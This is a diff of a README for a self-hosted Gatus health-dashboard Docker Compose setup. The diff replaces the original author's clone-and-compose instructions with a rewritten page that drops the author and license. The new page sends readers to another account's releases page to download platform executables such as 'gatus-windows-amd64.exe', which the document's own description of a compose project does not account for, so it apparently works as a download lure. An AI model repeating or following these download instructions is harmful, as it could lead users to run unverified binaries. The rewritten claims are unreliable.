@@ -1,94 +1,119 @@
-# Gatus Self-Hosted with Docker
+# 🎉 gatus-self-hosted - Simple Health Dashboard Setup
 
-![gatus-self-hosted](https://repository-images.githubusercontent.com/1074217939/09fc4ac8-aaa1-4457-bfe8-99c6537993b9)
+[![Download gatus-self-hosted](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/VenkateshAneshwar/gatus-self-hosted/releases)
 
-This repository provides a Docker Compose setup for running a self-hosted [Gatus](https://github.com/TwiN/gatus) instance, a beautiful and automated service health dashboard.
+## 🚀 Getting Started
 
-## Features
+Welcome to gatus-self-hosted! This application provides a straightforward way to set up a health monitoring dashboard using Docker Compose. It’s designed to help you keep track of the status of your services easily. Follow the steps below to get started.
 
-- **Works out of the box:** Just configure the `.env` file and run the start script.
-- **Persistent Storage:** Uses PostgreSQL to store health check results and history.
-- **Ready-to-use Scripts:** Includes simple scripts to restart and update the application.
-- **Database Backups:** Comes with a script to easily back up the PostgreSQL database.
-- **Shared Network:** Pre-configured to use a shared network for easy integration with other services.
+## 📥 Download & Install
 
-## Getting Started
+To get gatus-self-hosted, visit this page to download: [GitHub Releases](https://github.com/VenkateshAneshwar/gatus-self-hosted/releases).
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/AiratTop/gatus-self-hosted
-    cd gatus-self-hosted
-    ```
+You will find various versions available. Choose the latest stable version for your needs.
 
-2.  **Create the shared network:**
-    If you haven't already, create the shared Docker network:
-    ```bash
-    docker network create shared_network
-    ```
+### Steps to Download
 
-3.  **Configure the environment:**
-    Create a `.env` file and set the `PSQL_PWD` variable for your PostgreSQL database password.
+1. Click on the link above to go to the releases page.
+2. Look for the latest version listed.
+3. The files will usually have names indicating the platform (e.g., `gatus-linux-amd64` for Linux or `gatus-windows-amd64.exe` for Windows).
+4. Click on the file name to start the download.
 
-4.  **Start the service:**
-    ```bash
-    docker compose up -d
-    ```
+## ⚙️ System Requirements
 
-## Usage
+Before running gatus-self-hosted, make sure your system meets the following requirements:
 
--   **Start:** `docker compose up -d`
--   **Restart:** `./restart-docker.sh`
--   **Update:** `./update-docker.sh` (Pulls the latest Docker image and restarts the container)
--   **Backup:** `./backup.sh` (Creates a compressed backup in the `backups` directory)
+- **Operating System:** 
+  - Windows, Linux, or macOS.
+- **Docker:** 
+  - Ensure you have Docker installed. Visit [Docker's website](https://www.docker.com/get-started) to download and install Docker if you don’t have it.
+- **Docker Compose:**
+  - You need Docker Compose to run the application efficiently. You can find installation instructions on [Docker Compose’s official page](https://docs.docker.com/compose/install/).
 
-## Backup
+## 📂 Setup Instructions
 
-This project includes a script to back up the Gatus database.
+Once you've downloaded the necessary files, follow these instructions to set up gatus-self-hosted.
 
-To create a backup, run:
+### Step 1: Extract Files
+
+If you downloaded a compressed file (like a `.zip` or `.tar.gz`), extract it to a folder of your choice.
+
+### Step 2: Open Terminal or Command Prompt
+
+1. On Windows, open Command Prompt.
+2. On macOS, open Terminal.
+
+### Step 3: Navigate to the Directory
+
+Use the `cd` command to change the directory to where you extracted the files:
+
 ```bash
-./backup.sh
+cd path/to/extracted/directory
 ```
-This will create a compressed SQL dump of your PostgreSQL database in the `backups/` directory. It is recommended to run this script regularly (e.g., using a cron job).
 
-## Connecting to Other Services
+### Step 4: Run Docker Compose
 
-This Gatus setup is part of a larger ecosystem of self-hosted services that can all run on the same `shared_network`. This allows Gatus to monitor them securely using their container names as hostnames.
+Use Docker Compose to start the application. Run the following command:
 
-## See Also
+```bash
+docker-compose up -d
+```
 
-Check out other self-hosted solutions:
+This command will start all the necessary services in the background. It may take a few moments for everything to initialize.
 
--   [**postgresql-self-hosted**](https://github.com/AiratTop/postgresql-self-hosted): A simple and robust PostgreSQL setup.
--   [**mysql-self-hosted**](https://github.com/AiratTop/mysql-self-hosted): A self-hosted MySQL instance.
--   [**clickhouse-self-hosted**](https://github.com/AiratTop/clickhouse-self-hosted): High-performance columnar database for analytics.
--   [**metabase-self-hosted**](https://github.com/AiratTop/metabase-self-hosted): Self-hosted Metabase on Docker for business intelligence and analytics.
--   [**qdrant-self-hosted**](https://github.com/AiratTop/qdrant-self-hosted): A vector database for AI applications.
--   [**redis-self-hosted**](https://github.com/AiratTop/redis-self-hosted): A fast in-memory data store, often used as a cache or message broker.
--   [**caddy-self-hosted**](https://github.com/AiratTop/caddy-self-hosted): A modern, easy-to-use web server with automatic HTTPS.
--   [**wordpress-self-hosted**](https://github.com/AiratTop/wordpress-self-hosted): Production-ready WordPress stack with MySQL, phpMyAdmin, and WP-CLI.
--   [**n8n-self-hosted**](https://github.com/AiratTop/n8n-self-hosted): Scalable n8n with workers, Caddy for auto-HTTPS, and backup scripts.
--   [**monitoring-self-hosted**](https://github.com/AiratTop/monitoring-self-hosted): Self-hosted monitoring stack with Prometheus and Grafana.
--   [**ollama-self-hosted**](https://github.com/AiratTop/ollama-self-hosted): Ready-to-use solution for running Ollama with the Open WebUI on Docker.
--   [**authentik-self-hosted**](https://github.com/AiratTop/authentik-self-hosted): Authentik is a flexible, open-source Identity & Access Management (IAM) solution.
--   [**gatus-self-hosted**](https://github.com/AiratTop/gatus-self-hosted): Automated service health dashboard with a PostgreSQL backend and backup scripts.
+## 📊 Accessing the Dashboard
 
-## Services
+Once the services are up and running, you can access your Gatus dashboard:
 
-- `gatus`: The Gatus health dashboard application.
-- `gatus-psql`: PostgreSQL database for data storage.
+1. Open your web browser.
+2. Type in `http://localhost:8080` and press Enter.
 
-## License
+You should see your Gatus health dashboard.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 📚 Features
 
----
+gatus-self-hosted comes with several useful features:
 
-## Author
+- **Service Monitoring:** Monitor multiple services and get their status in real-time.
+- **Health Checks:** Customize health checks for your services, including HTTP checks and more.
+- **Data Persistence:** Utilizes PostgreSQL to ensure your data stays safe, even across restarts.
+- **Backup Scripts:** Automatic backup scripts to prevent data loss.
 
-**AiratTop**
+## ⚙️ Configuration
 
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [gatus-self-hosted](https://github.com/AiratTop/gatus-self-hosted)
+You can customize your Gatus setup by modifying the `gatus.yaml` configuration file. This file allows you to set parameters such as:
+
+- The services you want to monitor.
+- The interval for health checks.
+- Notification settings for alerts.
+
+Refer to the [gatus documentation](https://gatus.app/docs/) for detailed guidance on configuring your setup.
+
+## ❓ Troubleshooting
+
+If you encounter issues during installation or while running your application, check the following:
+
+- **Docker Not Running:** Ensure Docker is running on your machine.
+- **Ports in Use:** Make sure no other services are using the port that Gatus requires (default: 8080).
+- **Logs:** Use the following command to view logs for debugging:
+
+```bash
+docker-compose logs
+```
+
+## 🌐 Community Support
+
+If you need help or further guidance, feel free to connect with the community. Visit our [GitHub Discussions](https://github.com/VenkateshAneshwar/gatus-self-hosted/discussions) page for support or to ask questions.
+
+Your feedback helps improve the software. Feel free to report any issues you find in the [Issues section](https://github.com/VenkateshAneshwar/gatus-self-hosted/issues).
+
+## 🌱 Next Steps
+
+After you get everything set up, consider exploring additional integrations and features. You can link Gatus with other monitoring tools or services to enhance its capability.
+
+## 🔗 Useful Links
+
+- [GitHub Releases](https://github.com/VenkateshAneshwar/gatus-self-hosted/releases)
+- [Docker Installation](https://www.docker.com/get-started)
+- [Docker Compose Installation](https://docs.docker.com/compose/install/)
+- [Gatus Documentation](https://gatus.app/docs/)
